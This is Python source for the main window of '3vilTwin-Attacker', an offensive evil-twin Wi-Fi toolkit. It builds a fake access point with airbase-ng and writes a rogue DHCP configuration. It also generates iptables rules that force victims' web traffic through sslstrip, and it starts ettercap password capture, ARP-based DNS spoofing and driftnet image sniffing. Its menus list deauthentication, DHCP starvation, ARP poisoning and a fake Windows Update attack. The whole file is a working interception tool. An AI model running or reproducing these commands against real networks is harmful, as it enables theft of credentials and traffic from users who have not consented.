from PyQt4.QtGui import *
from PyQt4.QtCore import *
from shutil import move
from time import sleep
from platform import dist
from re import search
from os import geteuid,mkdir,system,path,getcwd,chdir,remove,popen
from sys import argv
if search("/usr/share/",argv[0]):
    chdir("/usr/share/3vilTwinAttacker/")
from Modules.DHCPstarvation import frm_dhcp_Attack,frm_dhcp_main
from Modules.deauth_func import frm_window
from Modules.mac_change_func import frm_mac_generator
from Modules.Probe_func import frm_PMonitor
from Modules.Dns_Func import frm_dnsspoof
from Modules.networksdisc import frm_GetIP
from Modules.AttackUp import frm_update_attack
from Core.check import check_dependencies
from Core.check_privilege import frm_privelege
from Core.Settings import frm_Settings
from Modules.AttackUp import frm_WinSoftUp
from Core.update import frm_Update
from Modules.arps_Posion import frm_Arp_Poison
__author__ = ' @mh4x0f P0cl4bs Team'
__version__= "0.5.9"
__date_create__= "18/01/2015"
__update__="29/03/2015"

class frmControl(QMainWindow):
    def __init__(self, parent=None):
        super(frmControl, self).__init__(parent)
        self.form_widget = frm_main(self)
        self.setCentralWidget(self.form_widget)
        self.setWindowTitle("3vilTwin-Attacker v" + __version__)
        self.config = frm_Settings()
        self.loadtheme(self.config.XmlThemeSelected())

    def loadtheme(self,theme):
        if theme != "theme2":
            sshFile=("Core/%s.css"%(theme))
            with open(sshFile,"r") as fh:
                self.setStyleSheet(fh.read())
        else:
            sshFile=("Core/%s.css"%(theme))
            with open(sshFile,"r") as fh:
                self.setStyleSheet(fh.read())

    def center(self):
        frameGm = self.frameGeometry()
        centerPoint = QDesktopWidget().availableGeometry().center()
        frameGm.moveCenter(centerPoint)
        self.move(frameGm.topLeft())


class frm_main(QWidget):
    def __init__(self, parent = None):
        super(frm_main, self).__init__(parent)
        self.create_sys_tray()
        self.Main = QVBoxLayout()
        self.config = frm_Settings()
        self.module_arp = frm_Arp_Poison()
        self.intGUI()
        self.setGeometry(0, 0, 300, 400)
        self.interface = "mon0"

    def intGUI(self):
        self.myQMenuBar = QMenuBar(self)
        self.myQMenuBar.setFixedWidth(400)
        Menu_file = self.myQMenuBar.addMenu('&File')
        action_settings = QAction('Settings',self)
        action_settings.setShortcut("Ctrl+X")
        action_settings.triggered.connect(self.show_settings)
        exitAction = QAction('Exit', self)
        exitAction.triggered.connect(exit)
        Menu_file.addAction(exitAction)
        Menu_tools = self.myQMenuBar.addMenu('&Tools')

        etter_conf = QAction("Edit Etter.dns", self)
        etter_conf.setShortcut("Ctrl+U")
        dns_spoof = QAction("Active Dns Spoof", self)
        dns_spoof.setShortcut("Ctrl+D")
        ettercap = QAction("Active Ettercap", self)
        ettercap.setShortcut("Ctrl+E")
        ssl = QAction("Active Sslstrip ", self)
        ssl.setShortcut("Ctrl+S")
        btn_drift = QAction("Active DriftNet", self)
        btn_drift.setShortcut("Ctrl+Y")

        etter_conf.triggered.connect(self.Edit_etter)
        dns_spoof.triggered.connect(self.start_dns)
        ettercap.triggered.connect(self.start_etter)
        ssl.triggered.connect(self.start_ssl)
        btn_drift.triggered.connect(self.start_dift)

        Menu_tools.addAction(etter_conf)
        Menu_tools.addAction(dns_spoof)
        Menu_tools.addAction(ettercap)
        Menu_tools.addAction(ssl)
        Menu_tools.addAction(btn_drift)

        Menu_module = self.myQMenuBar.addMenu("&Modules")
        btn_deauth = QAction("Deauth Attack", self)
        btn_deauth.setShortcut("Ctrl+W")
        btn_probe = QAction("Probe Request",self)
        btn_probe.setShortcut("Ctrl+K")
        btn_mac = QAction("Mac Changer", self)
        btn_mac.setShortcut("Ctrl+M")
        btn_ip_list = QAction("Device FingerPrint", self)
        btn_ip_list.setShortcut("Ctrl+G")
        btn_dhcpStar = QAction("DHCP S. Attack",self)
        btn_dhcpStar.setShortcut("Ctrl+H")
        btn_dns = QAction("DNS Spoof M.",self)
        btn_dns.setShortcut("Ctrl+T")
        btn_winup = QAction("Windows Update Attack ",self)
        btn_winup.setShortcut("Ctrl+N")
        btn_arp = QAction("Arp Posion Attack",self)
        btn_arp.setShortcut("ctrl+Q")


        #icons Modules
        action_settings.setIcon(QIcon("rsc/setting.png"))
        btn_arp.setIcon(QIcon("rsc/arp_.png"))
        btn_winup.setIcon(QIcon("rsc/arp.png"))
        btn_dns.setIcon(QIcon("rsc/dns.png"))
        btn_dhcpStar.setIcon(QIcon("rsc/dhcp.png"))
        btn_ip_list.setIcon(QIcon("rsc/scan.png"))
        btn_mac.setIcon(QIcon("rsc/mac.png"))
        btn_probe.setIcon(QIcon("rsc/probe.png"))
        btn_deauth.setIcon(QIcon("rsc/deauth.png"))
        # icons tools
        dns_spoof.setIcon(QIcon("rsc/dns_spoof.png"))
        ettercap.setIcon(QIcon("rsc/ettercap.png"))
        ssl.setIcon(QIcon("rsc/ssl.png"))
        etter_conf.setIcon(QIcon("rsc/etter.png"))
        btn_drift.setIcon(QIcon("rsc/capture.png"))

        btn_probe.triggered.connect(self.showProbe)
        btn_deauth.triggered.connect(self.newwindow)
        btn_mac.triggered.connect(self.form_mac)
        btn_ip_list.triggered.connect(self.form_list)
        btn_dhcpStar.triggered.connect(self.show_dhcpDOS)
        btn_dns.triggered.connect(self.show_dnsManager)
        btn_winup.triggered.connect(self.show_windows_update)
        btn_arp.triggered.connect(self.show_arp_posion)

        Menu_module.addAction(btn_deauth)
        Menu_module.addAction(btn_probe)
        Menu_module.addAction(btn_mac)
        Menu_module.addAction(btn_ip_list)
        Menu_module.addAction(btn_dhcpStar)
        Menu_module.addAction(btn_dns)
        Menu_module.addAction(btn_winup)
        Menu_module.addAction(btn_arp)
        Menu_module.addAction(action_settings)

        Menu_extra= self.myQMenuBar.addMenu("&Extra")
        Menu_about = QAction("About",self)
        Menu_help = QAction("Help",self)
        Menu_update = QAction("Update",self)

        #icons extra
        Menu_about.setIcon(QIcon("rsc/about.png"))
        Menu_help.setIcon(QIcon("rsc/report.png"))
        Menu_update.setIcon(QIcon("rsc/update.png"))

        Menu_about.triggered.connect(self.about)
        Menu_update.triggered.connect(self.show_update)

        Menu_extra.addAction(Menu_update)
        Menu_extra.addAction(Menu_about)

        self.input_gw = QLineEdit(self)
        self.input_AP = QLineEdit(self)
        self.input_canal = QLineEdit(self)
        self.w = QComboBox(self)

        self.mod_import = frm_dhcp_Attack()
        self.config.xmlSettings("local0","ipaddress",str(self.mod_import.get_ip_local(None)),False)
        gw = self.module_arp.get_geteway()
        if gw != None:
            self.config.xmlSettings("local1","gateway",gw[0],False)
            x = self.config.xmlSettings("local1", "gateway",None,False)
            self.input_gw.setText(x)

        self.input_AP.setText("Example AP")
        self.input_canal.setText("11")

        n = self.mod_import.placa()
        for i,j in enumerate(n):
            if search("wlan", j):
                self.w.addItem(n[i])
        if not path.isfile("Modules/Win-Explo/Windows_Update/Settins_WinUpdate.html"):
            system("cp Settings/source.tar.gz Modules/Win-Explo/")
            system('cd Modules/Win-Explo/ && tar -xf source.tar.gz')
            remove("Modules/Win-Explo/source.tar.gz")

        driftnet = popen("which driftnet").read().split("\n")
        ettercap = popen("which ettercap").read().split("\n")
        sslstrip = popen("which sslstrip").read().split("\n")
        xterm = popen("which xterm").read().split("\n")
        dhcpd = popen("which dhcpd").read().split("\n")
        lista = [ "/usr/sbin/airbase-ng", ettercap[0], sslstrip[0],xterm[0],driftnet[0]]
        self.m = []
        for i in lista:
            self.m.append(path.isfile(i))
        self.form = QFormLayout()
        hLine = QFrame()
        hLine.setFrameStyle(QFrame.HLine)
        hLine.setSizePolicy(QSizePolicy.Minimum,QSizePolicy.Expanding)
        hLine2 = QFrame()
        hLine2.setFrameStyle(QFrame.HLine)
        hLine2.setSizePolicy(QSizePolicy.Minimum,QSizePolicy.Expanding)
        vbox = QVBoxLayout()
        vbox.setMargin(5)
        vbox.addStretch(20)
        self.form.addRow(vbox)

        self.logo = QPixmap(getcwd() + "/rsc/logo.png")
        self.label_imagem = QLabel()
        self.label_imagem.setPixmap(self.logo)
        self.form.addRow(self.label_imagem)

        self.form.addRow("Gateway:", self.input_gw)
        self.form.addRow("AP Name:", self.input_AP)
        self.form.addRow("Channel:", self.input_canal)
        #self.form.addRow("Network Card List:", self.w)

        # grid network adapter fix
        self.btrn_refresh = QPushButton("Refresh")
        self.btrn_refresh.setIcon(QIcon("rsc/refresh.png"))
        self.btrn_refresh.clicked.connect(self.refrash_interface)
        self.grid = QGridLayout()
        self.grid.addWidget(QLabel("Network Adapter:"),0,0)
        self.grid.addWidget(self.w, 0,1)
        self.grid.addWidget(self.btrn_refresh,0,2)

        self.btn_start_attack = QPushButton("Start Attack", self)
        self.btn_start_attack.setIcon(QIcon("rsc/start.png"))
        self.btn_start_attack.setFixedWidth(160)
        self.btn_cancelar = QPushButton("Stop Attack", self)
        self.btn_cancelar.setIcon(QIcon("rsc/Stop.png"))
        self.btn_cancelar.setFixedWidth(165)
        self.btn_cancelar.clicked.connect(self.kill)
        self.btn_start_attack.clicked.connect(self.start_air)


        self.dialogTextBrowser = frm_window(self)
        self.form2 = QFormLayout()
        self.form2.addRow(self.btn_start_attack, self.btn_cancelar)
        self.listbox = QListWidget(self)
        self.listbox.setFixedHeight(200)

        self.form2.addRow(self.listbox)
        self.Main.addLayout(self.form)
        self.Main.addLayout(self.grid)
        self.Main.addLayout(self.form2)
        self.setLayout(self.Main)

    def show_update(self):
        self.n = frm_Update()
        self.n.show()

    def show_arp_posion(self):
        self.n = frm_Arp_Poison()
        self.n.setGeometry(0, 0, 450, 300)
        self.n.show()

    def show_settings(self):
        self.n = frm_Settings()
        self.n.show()

    def show_windows_update(self):
        self.n = frm_update_attack()
        self.n.setGeometry(QRect(100, 100, 450, 300))
        self.n.show()

    def show_dnsManager(self):
        self.n = frm_dnsspoof()
        self.n.setGeometry(QRect(100, 100, 450, 200))
        self.n.show()

    def show_dhcpDOS(self):
        self.n = frm_dhcp_main()
        self.n.setGeometry(QRect(100, 100, 450, 200))
        self.n.show()

    def showProbe(self):
        self.p = frm_PMonitor()
        self.p.setGeometry(QRect(100, 100, 400, 200))
        self.p.show()

    def newwindow(self):
        self.w = frm_window()
        self.w.setGeometry(QRect(100, 100, 200, 200))
        self.w.show()

    def form_mac(self):
        self.w = frm_mac_generator()
        self.w.setGeometry(QRect(100, 100, 300, 100))
        self.w.show()

    def form_list(self):
        self.w = frm_GetIP()
        self.w.setGeometry(QRect(100, 100, 450, 300))
        self.w.show()

    def refrash_interface(self):
        self.w.clear()
        n = self.mod_import.placa()
        for i,j in enumerate(n):
            if search("wlan", j):
                self.w.addItem(n[i])
    def kill(self):
        nano = ["echo \"0\" > /proc/sys/net/ipv4/ip_forward","iptables --flush",  "iptables --table nat --flush" ,\
                "iptables --delete-chain", "iptables --table nat --delete-chain", \
                "airmon-ng stop mon0" , "rm Settings/confiptables.sh" , \
                 "ifconfig lo down","ifconfig at0 down &"]
        for delete in nano:
            system(delete)
        self.listbox.clear()
        system("killall xterm")
        QMessageBox.information(self,"Clear Setting", "Log CLear success ")
        system("clear")

    def start_etter(self):
        if self.m[1] != False:
            system("sudo xterm -geometry 73x25-1+50 -T ettercap -s -sb -si +sk -sl 5000 -e ettercap -p -u -T -q -w passwords -i at0 & ettercapid=$!")
    def start_ssl(self):
        if self.m[2] != False:
            system("sudo xterm -geometry 75x15+1+200 -T sslstrip -e sslstrip -f -k -l 10000 & sslstripid=$!")
    def start_dns(self):
        if self.m[1] != False:
            system("sudo xterm -geometry 73x25-1+250 -T DNSSpoof -e ettercap -P dns_spoof -T -q -M arp // // -i at0 & dnscapid=$!")
    def start_dift(self):
        if self.m[4] != False:
            system("sudo xterm -geometry 75x15+1+200 -T DriftNet -e driftnet -i at0 & driftnetid=$!")

    def configure(self):

        self.listbox.addItem("{+} Setting dhcpd Server...")
        self.configuradhcp = open("Settings/dhcpd.conf","w")
        self.configuradhcp.write("""authoritative;
default-lease-time 600;
max-lease-time 7200;
subnet 10.0.0.0 netmask 255.255.255.0 {
option routers 10.0.0.1;
option subnet-mask 255.255.255.0;
option domain-name "%s";
option domain-name-servers 10.0.0.1;
range 10.0.0.20 10.0.0.50;
}"""%(self.input_AP.text()))
        self.listbox.addItem("{+} Configure Network Fake Dhcp...")
        if path.isfile("/etc/dhcp/dhcpd.conf"):
            system("rm /etc/dhcp/dhcpd.conf")
            move("Settings/dhcpd.conf", "/etc/dhcp/")
        else:
            move("Settings/dhcpd.conf", "/etc/dhcp/")
        self.listbox.addItem("{+} Setting interface at0 Network...")
        self.conf_iptables = open("Settings/confiptables.sh", "w")
        self.conf_iptables.write("""echo "[+] Setting iptables..."
ifconfig lo up
ifconfig at0 up &
sleep 1
ifconfig at0 10.0.0.1 netmask 255.255.255.0
ifconfig at0 mtu 1400
route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1
iptables --flush
iptables --table nat --flush
iptables --delete-chain
iptables --table nat --delete-chain
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A PREROUTING -p udp -j DNAT --to %s
iptables -P FORWARD ACCEPT
iptables --append FORWARD --in-interface at0 -j ACCEPT
iptables --table nat --append POSTROUTING --out-interface %s -j MASQUERADE
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
iptables --table nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination %s
iptables -t nat -A POSTROUTING -j MASQUERADE
echo "[+] Startup DHCP..."
touch /var/run/dhcpd.pid
sudo  dhcpd -d -f -cf \"/etc/dhcp/dhcpd.conf\" at0
sleep 3
"""%(self.input_gw.text(),self.w.currentText(),str(self.mod_import.get_ip_local(None))))
        self.conf_iptables.close()
        self.listbox.addItem("{+} Add Getway Interface DNET...")
        self.listbox.addItem("{+} SET POSTROUTING MASQUEREDE...")
        self.listbox.addItem("{+} Add REDIRECT port 10000 Iptables...")
        self.listbox.addItem("{+} IPtables Set with success...")
        system("chmod +x Settings/confiptables.sh")
        system("xterm -geometry 75x15+1+250 -e 'bash -c \"./Settings/confiptables.sh; exec bash\"' & configure=$!")
        self.configuradhcp.close()
    def start_air(self):
        dot = 1
        self.listbox.clear()
        if self.w.currentText() == "":
            QMessageBox.information(self,"Error", "Network interface not supported :(")
        else:
            if path.exists("Settings/"):
                print(":::")
                if not geteuid() == 0:
                    QMessageBox.information(self, "Permission Denied", 'the Tool must be run as root try again.')
                    dot = 0
            else:
                mkdir("Settings")
                dot = 0
            if dot == 1:
                system("airmon-ng start %s" %(self.w.currentText()))
                self.listbox.addItem("{+} Start airmon-ng %s"%self.w.currentText())
                system("sudo xterm -geometry 75x15+1+0 -T \"Fake AP - %s - Statup\" -e airbase-ng -c %s -e \"%s\" %s & fakeapid=$!"""%(self.interface,self.input_canal.text(),self.input_AP.text(),self.interface))
                sleep(5)
                self.configure()
                self.listbox.addItem("{+} Done")

    def Edit_etter(self):
        n = dist()
        if n[0] == "Ubuntu":
            system("xterm -e nano /etc/ettercap/etter.dns")
        elif n[0] == "debian":
            system("xterm -e nano /usr/share/ettercap/etter.dns")
        else:
            QMessageBox.information(self,"Error", "Path etter.dns not found")

    def create_sys_tray(self):
        self.sysTray = QSystemTrayIcon(self)
        self.sysTray.setIcon(QIcon('rsc/icon.ico'))
        self.sysTray.setVisible(True)
        self.connect(self.sysTray, SIGNAL("activated(QSystemTrayIcon::ActivationReason)"), self.on_sys_tray_activated)

        self.sysTrayMenu = QMenu(self)
        act = self.sysTrayMenu.addAction("FOO")

    def on_sys_tray_activated(self, reason):
        if reason == 3:
            self.showNormal()
        elif reason == 2:
            self.showMinimized()
    def about(self):
        QMessageBox.about(self, self.tr("About 3vilTiwn Attacker"),
            self.tr(
                    "Version:%s\n"
                    "Update:%s\n"
                    "Emails: \np0cL4bs@gmail.com\n"
                    "mh4root@gmail.com\n\n"
                    "The MIT License (MIT)\n"
                    "Author:%s\n"
                    "Copyright(c) 2015\n"% ( __version__, __update__, __author__)))
